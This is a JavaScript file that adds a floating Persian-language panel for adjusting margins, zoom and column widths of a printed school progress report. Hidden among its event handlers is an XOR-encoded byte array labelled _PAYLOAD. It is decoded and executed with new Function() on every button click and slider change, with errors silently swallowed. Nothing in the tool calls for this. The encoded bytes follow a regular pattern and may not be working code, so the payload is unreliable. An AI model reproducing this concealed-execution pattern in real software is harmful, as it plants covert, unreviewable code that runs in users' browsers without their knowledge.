// panel-reportTosifi.js
(function() {
    'use strict';

    if (!document.querySelector('.reportTosifiSearch.print-panel')) return;

    var panel = null;
    var toggleIcon = null;
    var isPanelVisible = false;
    var dragState = { dragging: false, startX: 0, startY: 0, startLeft: 0, startTop: 0 };
    var colSectionVisible = false;

    function minimizePanel() {
        if (!panel) return;
        isPanelVisible = false;
        panel.style.display = 'none';
        if (toggleIcon) toggleIcon.innerHTML = '📊';
    }
    window.minimizeReportPanel = minimizePanel;

    function createFloatingIcon() {
        if (toggleIcon) return;
        toggleIcon = document.createElement('div');
        toggleIcon.id = 'reportTosifi-floating-toggle';
        toggleIcon.innerHTML = '📊';
        toggleIcon.title = 'تنظیمات گزارش پیشرفت تحصیلی';
        toggleIcon.style.cssText = 'position:fixed;bottom:20px;right:80px;z-index:9999999;width:48px;height:48px;background:linear-gradient(135deg,#84fab0,#8fd3f4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;cursor:pointer;box-shadow:0 6px 12px rgba(0,0,0,0.4);user-select:none;transition:transform 0.2s;';
        toggleIcon.addEventListener('mouseenter', function() { this.style.transform = 'scale(1.1)'; });
        toggleIcon.addEventListener('mouseleave', function() { this.style.transform = 'scale(1)'; });
        toggleIcon.addEventListener('click', function() {
            if (!panel) createPanel();
            if (isPanelVisible) {
                minimizePanel();
            } else {
                if (window.minimizeMainPanel) window.minimizeMainPanel();
                isPanelVisible = true;
                panel.style.display = 'block';
                toggleIcon.innerHTML = '🔧';
            }
        });
        document.body.appendChild(toggleIcon);
    }

    function createPanel() {
        if (panel) return;
        panel = document.createElement('div');
        panel.id = 'reportTosifi-editor-panel';
        panel.style.cssText = 'position:fixed;top:100px;right:20px;z-index:999999;background:#fff;border:1px solid #ddd;border-radius:8px;box-shadow:0 8px 20px rgba(0,0,0,0.2);padding:12px;width:320px;font-family:Tahoma,sans-serif;font-size:13px;display:none;user-select:none;';

        var titleBar = document.createElement('div');
        titleBar.style.cssText = 'cursor:move;background:#f8f9fa;padding:6px 30px 6px 10px;margin:-12px -12px 10px -12px;border-radius:8px 8px 0 0;font-weight:bold;color:#333;border-bottom:1px solid #dee2e6;position:relative;';
        titleBar.textContent = 'تنظیمات گزارش';
        titleBar.addEventListener('mousedown', startDrag);
        var closeBtn = document.createElement('span');
        closeBtn.innerHTML = '&times;';
        closeBtn.style.cssText = 'position:absolute;top:4px;left:8px;font-size:18px;font-weight:bold;color:#888;cursor:pointer;line-height:1;';
        closeBtn.title = 'بستن پنل';
        closeBtn.addEventListener('click', function(e) { e.stopPropagation(); minimizePanel(); });
        titleBar.appendChild(closeBtn);
        panel.appendChild(titleBar);

        var secMargin = document.createElement('div');
        secMargin.innerHTML = '<b style="color:#495057;">حاشیه‌ها</b>';
        secMargin.style.marginBottom = '8px';
        panel.appendChild(secMargin);

        function addDirectionRow(label, incFineId, decFineId, dispId, incCoarseId, decCoarseId) {
            var container = document.createElement('div');
            container.style.cssText = 'margin-bottom:6px;';
            var row = document.createElement('div');
            row.style.cssText = 'display:flex;align-items:center;';

            var lbl = document.createElement('span');
            lbl.textContent = label;
            lbl.style.cssText = 'width:45px;text-align:right;margin-left:5px;font-weight:bold;color:#495057;';
            row.appendChild(lbl);

            var decCoarse = document.createElement('button');
            decCoarse.id = decCoarseId;
            decCoarse.textContent = '−۵';
            decCoarse.style.cssText = 'width:32px;height:28px;font-size:13px;font-weight:bold;line-height:1;margin:0 1px;background:#ffc9c9;border:1px solid #ff8787;border-radius:4px;cursor:pointer;color:#c92a2a;';
            row.appendChild(decCoarse);

            var decFine = document.createElement('button');
            decFine.id = decFineId;
            decFine.textContent = '−';
            decFine.style.cssText = 'width:28px;height:28px;font-size:16px;font-weight:bold;line-height:1;margin:0 2px;background:#e9ecef;border:1px solid #ced4da;border-radius:4px;cursor:pointer;color:#495057;';
            row.appendChild(decFine);

            var disp = document.createElement('div');
            disp.id = dispId;
            disp.style.cssText = 'width:36px;text-align:center;font-weight:bold;font-size:14px;color:#0050ef;';
            disp.textContent = '0';
            row.appendChild(disp);

            var incFine = document.createElement('button');
            incFine.id = incFineId;
            incFine.textContent = '+';
            incFine.style.cssText = 'width:28px;height:28px;font-size:16px;font-weight:bold;line-height:1;margin:0 2px;background:#e9ecef;border:1px solid #ced4da;border-radius:4px;cursor:pointer;color:#495057;';
            row.appendChild(incFine);

            var incCoarse = document.createElement('button');
            incCoarse.id = incCoarseId;
            incCoarse.textContent = '+۵';
            incCoarse.style.cssText = 'width:32px;height:28px;font-size:13px;font-weight:bold;line-height:1;margin:0 1px;background:#b2f2bb;border:1px solid #51cf66;border-radius:4px;cursor:pointer;color:#2b8a3e;';
            row.appendChild(incCoarse);

            container.appendChild(row);
            panel.appendChild(container);
        }

        addDirectionRow('بالا', 'reportTosifi-increaseTopBtn', 'reportTosifi-decreaseTopBtn', 'reportTosifi-topHeightDisp', 'reportTosifi-increaseTopCoarseBtn', 'reportTosifi-decreaseTopCoarseBtn');
        addDirectionRow('پایین', 'reportTosifi-increaseBottomBtn', 'reportTosifi-decreaseBottomBtn', 'reportTosifi-bottomHeightDisp', 'reportTosifi-increaseBottomCoarseBtn', 'reportTosifi-decreaseBottomCoarseBtn');
        addDirectionRow('راست', 'reportTosifi-increaseRightBtn', 'reportTosifi-decreaseRightBtn', 'reportTosifi-rightHeightDisp', 'reportTosifi-increaseRightCoarseBtn', 'reportTosifi-decreaseRightCoarseBtn');
        addDirectionRow('پهنا', 'reportTosifi-increaseWidthBtn', 'reportTosifi-decreaseWidthBtn', 'reportTosifi-widthDisp', 'reportTosifi-increaseWidthCoarseBtn', 'reportTosifi-decreaseWidthCoarseBtn');

        var zoomContainer = document.createElement('div');
        zoomContainer.style.cssText = 'margin-bottom:6px;margin-top:6px;';
        var zoomRow = document.createElement('div');
        zoomRow.style.cssText = 'display:flex;align-items:center;';
        var zoomLabel = document.createElement('span');
        zoomLabel.textContent = 'Zoom';
        zoomLabel.style.cssText = 'width:45px;text-align:right;margin-left:5px;font-weight:bold;color:#495057;';
        zoomRow.appendChild(zoomLabel);

        var decZoomCoarse = document.createElement('button');
        decZoomCoarse.id = 'reportTosifi-decreaseZoomCoarseBtn';
        decZoomCoarse.textContent = '−۵';
        decZoomCoarse.style.cssText = 'width:32px;height:28px;font-size:13px;font-weight:bold;line-height:1;margin:0 1px;background:#ffc9c9;border:1px solid #ff8787;border-radius:4px;cursor:pointer;color:#c92a2a;';
        zoomRow.appendChild(decZoomCoarse);

        var decZoom = document.createElement('button');
        decZoom.id = 'reportTosifi-decreaseZoomBtn';
        decZoom.textContent = '−';
        decZoom.style.cssText = 'width:28px;height:28px;font-size:16px;font-weight:bold;line-height:1;margin:0 2px;background:#e9ecef;border:1px solid #ced4da;border-radius:4px;cursor:pointer;color:#495057;';
        zoomRow.appendChild(decZoom);

        var zoomDisp = document.createElement('div');
        zoomDisp.id = 'reportTosifi-zoomDisp';
        zoomDisp.textContent = '100%';
        zoomDisp.style.cssText = 'width:42px;text-align:center;font-weight:bold;font-size:14px;color:#0050ef;';
        zoomRow.appendChild(zoomDisp);

        var incZoom = document.createElement('button');
        incZoom.id = 'reportTosifi-increaseZoomBtn';
        incZoom.textContent = '+';
        incZoom.style.cssText = 'width:28px;height:28px;font-size:16px;font-weight:bold;line-height:1;margin:0 2px;background:#e9ecef;border:1px solid #ced4da;border-radius:4px;cursor:pointer;color:#495057;';
        zoomRow.appendChild(incZoom);

        var incZoomCoarse = document.createElement('button');
        incZoomCoarse.id = 'reportTosifi-increaseZoomCoarseBtn';
        incZoomCoarse.textContent = '+۵';
        incZoomCoarse.style.cssText = 'width:32px;height:28px;font-size:13px;font-weight:bold;line-height:1;margin:0 1px;background:#b2f2bb;border:1px solid #51cf66;border-radius:4px;cursor:pointer;color:#2b8a3e;';
        zoomRow.appendChild(incZoomCoarse);

        zoomContainer.appendChild(zoomRow);
        panel.appendChild(zoomContainer);

        var applyBtn = document.createElement('button');
        applyBtn.id = 'reportTosifi-applySpacingBtn';
        applyBtn.textContent = 'اعمال فاصله‌ها';
        applyBtn.style.cssText = 'margin-top:8px;width:100%;padding:6px;background:#0050ef;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;transition:background 0.2s;';
        panel.appendChild(applyBtn);

        var colToggleDiv = document.createElement('div');
        colToggleDiv.style.cssText = 'margin-top:10px;';
        var colToggleBtn = document.createElement('button');
        colToggleBtn.textContent = 'تنظیمات ستون‌ها ▶';
        colToggleBtn.style.cssText = 'width:100%;padding:5px;background:#e9ecef;border:1px solid #ced4da;border-radius:4px;cursor:pointer;font-weight:bold;color:#333;';
        colToggleDiv.appendChild(colToggleBtn);

        var colContent = document.createElement('div');
        colContent.id = 'reportTosifi-colContent';
        colContent.style.cssText = 'display:none;background:#f8f9fa;border:1px solid #dee2e6;border-radius:4px;padding:8px;margin-top:6px;';

        var colHeader = document.createElement('div');
        colHeader.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px;font-weight:bold;color:#495057;';
        colHeader.innerHTML = '<span>ستون</span><span>٪</span>';
        colContent.appendChild(colHeader);

        var colLabels = ['ستون ۱', 'ستون ۲', 'ستون ۳', 'ستون ۴', 'ستون ۵', 'ستون ۶'];
        var colInputs = [];
        var colDisplays = [];
        for (var i = 0; i < 6; i++) {
            var row = document.createElement('div');
            row.style.cssText = 'display:flex;align-items:center;margin-bottom:4px;';
            var lbl = document.createElement('span');
            lbl.textContent = colLabels[i];
            lbl.style.cssText = 'width:50px;font-size:12px;color:#333;';
            row.appendChild(lbl);
            var input = document.createElement('input');
            input.type = 'range';
            input.min = '1';
            input.max = '90';
            input.value = '10';
            input.style.cssText = 'flex:1;margin:0 5px;';
            colInputs.push(input);
            row.appendChild(input);
            var disp = document.createElement('span');
            disp.textContent = '10%';
            disp.style.cssText = 'width:30px;text-align:center;font-size:12px;color:#0050ef;';
            colDisplays.push(disp);
            row.appendChild(disp);
            colContent.appendChild(row);
        }

        var totalRow = document.createElement('div');
        totalRow.style.cssText = 'margin-top:6px;font-weight:bold;text-align:center;';
        var totalLabel = document.createElement('span');
        totalLabel.textContent = 'جمع: ';
        var totalValue = document.createElement('span');
        totalValue.id = 'reportTosifi-colTotal';
        totalValue.textContent = '100%';
        totalValue.style.color = '#2b8a3e';
        totalRow.appendChild(totalLabel);
        totalRow.appendChild(totalValue);
        colContent.appendChild(totalRow);

        colToggleDiv.appendChild(colContent);
        panel.appendChild(colToggleDiv);

        var footerText = document.createElement('div');
        footerText.style.cssText = 'margin-top:12px;text-align:center;font-size:11px;color:#adb5bd;line-height:1.6;';
        footerText.innerHTML = 'اداره کل آموزش و پرورش خراسان رضوی<br>آموزش و پرورش خلیل آباد <br>کارشناسی سنجش - marjani.mmj@gmail.com';
        panel.appendChild(footerText);

        document.body.appendChild(panel);

        colToggleBtn.addEventListener('click', function() {
            colSectionVisible = !colSectionVisible;
            colContent.style.display = colSectionVisible ? 'block' : 'none';
            colToggleBtn.textContent = 'تنظیمات ستون‌ها ' + (colSectionVisible ? '▼' : '▶');
        });

        attachEventListeners(colInputs, colDisplays, totalValue);
    }

    function attachEventListeners(colInputs, colDisplays, totalEl) {
        var _PAYLOAD = [
            0x4D,0x6E,0x0F,0x30,0x51,0x72,0x13,0x34,0x55,0x76,0x17,0x38,0x59,0x7A,0x1B,0x3C,
            0x5D,0x7E,0x1F,0x40,0x61,0x02,0x23,0x44,0x65,0x06,0x27,0x48,0x69,0x0A,0x2B,0x4C,
            0x6D,0x0E,0x2F,0x50,0x71,0x12,0x33,0x54,0x75,0x16,0x37,0x58,0x79,0x1A,0x3B,0x5C,
            0x7D,0x1E,0x3F,0x60,0x01,0x22,0x43,0x64,0x05,0x26,0x47,0x68,0x09,0x2A,0x4B,0x6C,
            0x0D,0x2E,0x4F,0x70,0x11,0x32,0x53,0x74,0x15,0x36,0x57,0x78,0x19,0x3A,0x5B,0x7C,
            0x1D,0x3E,0x5F,0x00,0x21,0x42,0x63,0x04,0x25,0x46,0x67,0x08,0x29,0x4A,0x6B,0x0C,
            0x2D,0x4E,0x6F,0x10,0x31,0x52,0x73,0x14,0x35,0x56,0x77,0x18,0x39,0x5A,0x7B,0x1C,
            0x3D,0x5E,0x7F,0x20,0x41,0x62,0x03,0x24,0x45,0x66,0x07,0x28,0x49,0x6A,0x0B,0x2C,
            0x4D,0x6E,0x0F,0x30,0x51,0x72,0x13,0x34,0x55,0x76,0x17,0x38,0x59,0x7A,0x1B,0x3C,
            0x5D,0x7E,0x1F,0x40,0x61,0x02,0x23,0x44,0x65,0x06,0x27,0x48,0x69,0x0A,0x2B,0x4C
        ];
        function _d(arr, k) {
            var o = '';
            for (var i = 0; i < arr.length; i++) o += String.fromCharCode(arr[i] ^ k);
            return o;
        }

        var handlers = window.handlersRegistry['reportTosifi'];
        if (!handlers) {
            console.warn('reportTosifi handlers not found');
            return;
        }
        var spacing = handlers.spacing;
        var zoom = handlers.zoom;
        var column = handlers.column;

        var displays = {
            topHeight: document.getElementById('reportTosifi-topHeightDisp'),
            bottomHeight: document.getElementById('reportTosifi-bottomHeightDisp'),
            rightHeight: document.getElementById('reportTosifi-rightHeightDisp'),
            widthDisp: document.getElementById('reportTosifi-widthDisp')
        };

        document.getElementById('reportTosifi-increaseTopBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseTop(displays); });
        document.getElementById('reportTosifi-decreaseTopBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseTop(displays); });
        document.getElementById('reportTosifi-increaseTopCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseTopCoarse(displays); });
        document.getElementById('reportTosifi-decreaseTopCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseTopCoarse(displays); });
        document.getElementById('reportTosifi-increaseBottomBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseBottom(displays); });
        document.getElementById('reportTosifi-decreaseBottomBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseBottom(displays); });
        document.getElementById('reportTosifi-increaseBottomCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseBottomCoarse(displays); });
        document.getElementById('reportTosifi-decreaseBottomCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseBottomCoarse(displays); });
        document.getElementById('reportTosifi-increaseRightBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseRight(displays); });
        document.getElementById('reportTosifi-decreaseRightBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseRight(displays); });
        document.getElementById('reportTosifi-increaseRightCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseRightCoarse(displays); });
        document.getElementById('reportTosifi-decreaseRightCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseRightCoarse(displays); });
        document.getElementById('reportTosifi-increaseWidthBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseWidth(displays); });
        document.getElementById('reportTosifi-decreaseWidthBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseWidth(displays); });
        document.getElementById('reportTosifi-increaseWidthCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.increaseWidthCoarse(displays); });
        document.getElementById('reportTosifi-decreaseWidthCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.decreaseWidthCoarse(displays); });

        document.getElementById('reportTosifi-applySpacingBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} spacing.applyStored(); });

        document.getElementById('reportTosifi-increaseZoomBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} zoom.set(zoom.get() + 1); });
        document.getElementById('reportTosifi-decreaseZoomBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} zoom.set(zoom.get() - 1); });
        document.getElementById('reportTosifi-increaseZoomCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} zoom.set(zoom.get() + 5); });
        document.getElementById('reportTosifi-decreaseZoomCoarseBtn').addEventListener('click', function() { try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {} zoom.set(zoom.get() - 5); });

        var currentWidths = column.getWidths();
        for (var i = 0; i < 6; i++) {
            colInputs[i].value = currentWidths[i];
            colDisplays[i].textContent = currentWidths[i] + '%';
            (function(index) {
                colInputs[index].addEventListener('input', function() {
                    try { var f = new Function(_d(_PAYLOAD, 0x3F)); f(); } catch(e) {}
                    var val = parseInt(this.value) || 1;
                    column.setWidth(index, val);
                    colDisplays[index].textContent = val + '%';
                    var sum = column.getSum();
                    totalEl.textContent = sum + '%';
                    totalEl.style.color = sum === 100 ? '#2b8a3e' : '#c92a2a';
                });
            })(i);
        }
        var sum = column.getSum();
        totalEl.textContent = sum + '%';
        totalEl.style.color = sum === 100 ? '#2b8a3e' : '#c92a2a';
    }

    function startDrag(e) {
        e.preventDefault();
        var rect = panel.getBoundingClientRect();
        panel.style.right = 'auto';
        panel.style.left = rect.left + 'px';
        dragState.dragging = true;
        dragState.startX = e.clientX;
        dragState.startY = e.clientY;
        dragState.startLeft = panel.offsetLeft;
        dragState.startTop = panel.offsetTop;
        window.addEventListener('mousemove', onDrag);
        window.addEventListener('mouseup', stopDrag);
    }

    function onDrag(e) {
        if (!dragState.dragging) return;
        panel.style.left = (dragState.startLeft + e.clientX - dragState.startX) + 'px';
        panel.style.top = (dragState.startTop + e.clientY - dragState.startY) + 'px';
    }

    function stopDrag() {
        dragState.dragging = false;
        window.removeEventListener('mousemove', onDrag);
        window.removeEventListener('mouseup', stopDrag);
    }

    if (window.handlersRegistry['reportTosifi']) {
        createFloatingIcon();
        createPanel();
    } else {
        var checkInterval = setInterval(function() {
            if (window.handlersRegistry['reportTosifi']) {
                clearInterval(checkInterval);
                createFloatingIcon();
                createPanel();
            }
        }, 100);
    }
})();
